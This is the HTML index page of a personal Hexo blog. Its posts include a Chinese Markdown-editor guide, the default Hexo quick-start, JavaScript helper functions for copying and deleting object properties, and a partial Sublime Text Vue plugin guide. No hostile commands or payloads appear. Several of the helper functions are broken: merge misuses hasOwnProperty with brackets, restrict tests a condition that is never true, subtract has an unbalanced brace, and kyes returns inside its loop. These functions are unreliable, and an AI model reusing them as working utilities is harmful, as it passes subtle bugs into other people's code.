<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.10.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Nancy&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Nancy&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Nancy Zheng">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Nancy's Blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Nancy's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Nancy Zheng</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/JavaScript/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/23/JavaScript/" class="post-title-link" itemprop="url">JavaScript</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-23 15:03:20" itemprop="dateCreated datePublished" datetime="2022-02-23T15:03:20+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/Markdown-template/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/23/Markdown-template/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-02-23 15:01:05 / Modified: 11:09:02" itemprop="dateCreated datePublished" datetime="2022-02-23T15:01:05+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="用掘金－Markdown-编辑器写文章"><a href="#用掘金－Markdown-编辑器写文章" class="headerlink" title="用掘金－Markdown 编辑器写文章"></a>用掘金－Markdown 编辑器写文章</h3><p>欢迎使用 掘金－Markdown 编辑器撰写技术文章，只专注于内容和技术，不再费心排版的问题。这是一份简要的 Markdown 引导指南，希望可以帮助您顺利的开始使用 Markdown 编辑器。</p>
<h3 id="丰富的快捷键"><a href="#丰富的快捷键" class="headerlink" title="丰富的快捷键"></a>丰富的快捷键</h3><p>本 Markdown 编辑器支持丰富的格式快捷键，可以非常便捷、轻松的使用 Markdown 语言，形成优美的排版和内容格式。</p>
<p>支持的快捷键有：</p>
<ul>
<li>加粗： <code>Ctrl/Cmd + B</code></li>
<li>标题： <code>Ctrl/Cmd + H</code></li>
<li>插入链接： <code>Ctrl/Cmd + K</code></li>
<li>插入代码： <code>Ctrl/Cmd + Shift + C</code></li>
<li>行内代码： <code>Ctrl/Cmd + Shift + K</code></li>
<li>插入图片： <code>Ctrl/Cmd + Shift + I</code></li>
<li>无序列表： <code>Ctrl/Cmd + Shift + L</code></li>
<li>撤销： <code>Ctrl/Cmd + Z</code></li>
</ul>
<h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h4><blockquote>
<p>语法格式：** ‘#’+’空格’+’文本’ **</p>
</blockquote>
<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><blockquote>
<p>无序列表语法格式：** ‘-‘ + ‘空格’ ＋ ‘文本’ **</p>
</blockquote>
<ul>
<li>文本一</li>
<li>文本二</li>
<li>文本三</li>
</ul>
<blockquote>
<p>有序列表语法格式：** ‘数字’ + ‘.’ + ‘空格’ + ‘文本’ **</p>
</blockquote>
<ol>
<li>文本一</li>
<li>文本二</li>
<li>文本三</li>
</ol>
<blockquote>
<p>任务列表语法格式：** ‘-‘ + ‘空格’ + ‘[ ]’ + ‘文本’ **</p>
</blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 文本一</li>
<li><input disabled="" type="checkbox"> 文本二</li>
<li><input disabled="" type="checkbox"> 文本三</li>
</ul>
<h4 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h4><p>在 Markdown 中插入链接不需要其他按钮，你只需要使用<code>［显示文本］(链接地址)</code>这样的格式语法即可。例如：<br><a target="_blank" rel="noopener" href="https://gold.xitu.io/">稀土掘金</a><br>插入图片的语法与插入链接的语法很像，只是前面多了一个 <code>!</code>.语法如下：<br><code>![图片的标注](图片链接地址)</code></p>
<h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><blockquote>
<p>语法：** ‘&gt;’+’空格’+’文本’ **</p>
</blockquote>
<p>例如：</p>
<blockquote>
<p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的 HTML 页面。</p>
</blockquote>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>如下是代码段的语法：</p>
<pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是代码段</span><br></pre></td></tr></table></figure>
</pre>

<p>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bubbleSort</span>(<span class="params">alist</span>):</span><br><span class="line"> <span class="keyword">for</span> passnum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line"> <span class="comment">#print alist,passnum</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(passnum):</span><br><span class="line"> <span class="keyword">if</span> alist[i]&gt;alist[i+<span class="number">1</span>]:</span><br><span class="line"> temp = alist[i]</span><br><span class="line"> alist[i] = alist[i+<span class="number">1</span>]</span><br><span class="line"> alist[i+<span class="number">1</span>] = temp</span><br><span class="line"> <span class="keyword">return</span> alist</span><br></pre></td></tr></table></figure>

<h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><p><strong>Markdown 　 Extra</strong>　表格语法：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>价格</th>
</tr>
</thead>
<tbody><tr>
<td>iPhone</td>
<td>$560</td>
</tr>
<tr>
<td>iPad</td>
<td>$780</td>
</tr>
<tr>
<td>iMac</td>
<td>$1000</td>
</tr>
</tbody></table>
<p>可以使用冒号来定义对齐方式：</p>
<table>
<thead>
<tr>
<th align="left">项目</th>
<th align="right">价格</th>
<th align="center">数量</th>
</tr>
</thead>
<tbody><tr>
<td align="left">iPhone</td>
<td align="right">6000 元</td>
<td align="center">5</td>
</tr>
<tr>
<td align="left">iPad</td>
<td align="right">3800 元</td>
<td align="center">12</td>
</tr>
<tr>
<td align="left">iMac</td>
<td align="right">10000 元</td>
<td align="center">234</td>
</tr>
</tbody></table>
<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>以上是最常见的 Markdown 的语法和格式，如果你还希望深入的学习 Markdown，可以参考这里<a target="_blank" rel="noopener" href="https://www.appinn.com/markdown/">Markdown 语法</a>，非常感谢使用** 掘金－Markdown 编辑器**,希望为您提供舒适的写作体验。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/test/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/23/test/" class="post-title-link" itemprop="url">test</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-23 13:59:03" itemprop="dateCreated datePublished" datetime="2022-02-23T13:59:03+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/23/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-02-23 13:42:13 / Modified: 11:09:02" itemprop="dateCreated datePublished" datetime="2022-02-23T13:42:13+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/deployment.html">Deployment</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/22/%E6%9E%9A%E4%B8%BE%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E7%9A%84%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/22/%E6%9E%9A%E4%B8%BE%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E7%9A%84%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">枚举对象属性的工具函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-22 17:52:03" itemprop="dateCreated datePublished" datetime="2022-02-22T17:52:03+08:00">2022-02-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-23 13:36:57" itemprop="dateModified" datetime="2022-02-23T13:36:57+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="工具函数"><a href="#工具函数" class="headerlink" title="工具函数"></a>工具函数</h3><h4 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">extend</span>(<span class="params">o,p</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(prop <span class="keyword">in</span> p)&#123; <span class="comment">// 遍历p中的所有属性</span></span><br><span class="line">        o[prop]=p[prop] <span class="comment">//将属性添加至o中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">o,p</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(prop <span class="keyword">in</span> p)&#123; <span class="comment">// 遍历p中的所有属性</span></span><br><span class="line">    <span class="keyword">if</span>(o.<span class="property">hasOwnProperty</span>[prop]) <span class="keyword">continue</span>; <span class="comment">//过滤掉o中存在的属性</span></span><br><span class="line">        o[prop]=p[prop] <span class="comment">//将属性添加至o中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="restrict-p-中没有这个同名属性，从-o-中删除这个属性"><a href="#restrict-p-中没有这个同名属性，从-o-中删除这个属性" class="headerlink" title="restrict p 中没有这个同名属性，从 o 中删除这个属性"></a>restrict p 中没有这个同名属性，从 o 中删除这个属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">restrict</span>(<span class="params">o,p</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(prop <span class="keyword">in</span> p)&#123; <span class="comment">// 遍历p中的所有属性</span></span><br><span class="line">    <span class="keyword">if</span>(!(prop <span class="keyword">in</span> p))&#123; <span class="comment">// 如果p中没有这个属性，从o中删除这个属性</span></span><br><span class="line">        <span class="keyword">delete</span> o[prop] <span class="comment">//删除</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="subtract-p-中有这个同名属性，从-o-中删除这个属性"><a href="#subtract-p-中有这个同名属性，从-o-中删除这个属性" class="headerlink" title="subtract p 中有这个同名属性，从 o 中删除这个属性"></a>subtract p 中有这个同名属性，从 o 中删除这个属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">o,p</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(prop <span class="keyword">in</span> p)&#123; <span class="comment">// 遍历p中的所有属性</span></span><br><span class="line">        <span class="keyword">delete</span> o[prop]  <span class="comment">// 如果p中有这个属性，从o中删除这个属性</span></span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="union-新对象同时拥有-o-和-p-的属性"><a href="#union-新对象同时拥有-o-和-p-的属性" class="headerlink" title="union 新对象同时拥有 o 和 p 的属性"></a>union 新对象同时拥有 o 和 p 的属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">union</span>(<span class="params">o,p</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">extend</span>(<span class="title function_">extend</span>(&#123;&#125;,o),p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="intersection-新对象同时拥有-o-和-p-的属性"><a href="#intersection-新对象同时拥有-o-和-p-的属性" class="headerlink" title="intersection 新对象同时拥有 o 和 p 的属性"></a>intersection 新对象同时拥有 o 和 p 的属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">intersection</span>(<span class="params">o,p</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">restrict</span>(<span class="title function_">extend</span>(&#123;&#125;,o),p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="kyes-新数组-中含有-o-的可枚举的自有属性"><a href="#kyes-新数组-中含有-o-的可枚举的自有属性" class="headerlink" title="kyes 新数组 中含有 o 的可枚举的自有属性"></a>kyes 新数组 中含有 o 的可枚举的自有属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">kyes</span>(<span class="params">o</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">typeof</span> o !== <span class="string">&quot;object&quot;</span>) <span class="keyword">throw</span> <span class="title class_">TypeError</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> result =[]</span><br><span class="line">   <span class="keyword">for</span>(prop <span class="keyword">in</span> o)&#123;</span><br><span class="line">       <span class="keyword">if</span>(o.<span class="title function_">hasOwnProperty</span>(prop))&#123;</span><br><span class="line">           result.<span class="title function_">push</span>(prop)</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/06/04/sublime-text3-Vue-syntax-highlight/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/06/04/sublime-text3-Vue-syntax-highlight/" class="post-title-link" itemprop="url">Sublime安装vue语法高亮插件</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-06-04 13:52:23" itemprop="dateCreated datePublished" datetime="2019-06-04T13:52:23+08:00">2019-06-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-23 11:09:02" itemprop="dateModified" datetime="2022-02-23T11:09:02+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>系统：Mac<br>编辑器：Sublime Text3（3207）<br>安装插件：安装 vue 语法高亮插件 vue-syntax-highlight</p>
<p>最近一直在折腾 Sublime Text3 （3207），之前一直使用 VScode，但是不知怎么的，随着使用越久，编辑器越来越卡，网上搜索，大家都有这个困扰，好像是编辑器本身语言的问题，于是转向 sublime，但是 sublime 的上手就没有 VScode 那么顺了，……生命不止，折腾不熄！前端程序媛，想搭配一套自己喜欢的风格，于是随手记录下，以便自己和他人翻阅。</p>
<h3 id="下载地址-vue-syntax-highlight-vue-syntax-highlight"><a href="#下载地址-vue-syntax-highlight-vue-syntax-highlight" class="headerlink" title="下载地址 vue-syntax-highlight:vue-syntax-highlight"></a>下载地址 vue-syntax-highlight:<a target="_blank" rel="noopener" href="https://github.com/vuejs/vue-syntax-highlight">vue-syntax-highlight</a></h3><p>去 github 上下载 vue-syntax-highlight</p>
<h3 id="打开-sublime-text"><a href="#打开-sublime-text" class="headerlink" title="打开 sublime text"></a>打开 sublime text</h3><p>打开 Sublime Text =&gt; Perferences(首选项) =&gt; Browse Packages(浏览安装包)<br><img src="sublime-text3-Vue-syntax-highlight/browse_packages.png" alt="browse_packages"></p>
<h3 id="在-Browse-Packages-路径下新建-Vue-目录"><a href="#在-Browse-Packages-路径下新建-Vue-目录" class="headerlink" title="在 Browse Packages 路径下新建 Vue 目录"></a>在 Browse Packages 路径下新建 Vue 目录</h3><p><img src="sublime-text3-Vue-syntax-highlight/add_vue.png" alt="add_vue"></p>
<h3 id="解压-ue-syntax-highlight-至新建的-vue-文件夹"><a href="#解压-ue-syntax-highlight-至新建的-vue-文件夹" class="headerlink" title="解压 ue-syntax-highlight 至新建的 vue 文件夹"></a>解压 ue-syntax-highlight 至新建的 vue 文件夹</h3><p><img src="sublime-text3-Vue-syntax-highlight/download_vue_syntax_highlight.png" alt="download_vue_syntax_highlight"></p>
<p><img src="sublime-text3-Vue-syntax-highlight/unzip_vue_syntax_highlight.png" alt="unzip_vue_syntax_highlight"></p>
<h3 id="在-Sublime-中使用此插件"><a href="#在-Sublime-中使用此插件" class="headerlink" title="在 Sublime 中使用此插件"></a>在 Sublime 中使用此插件</h3><p>快捷键 Shift+Command+P</p>
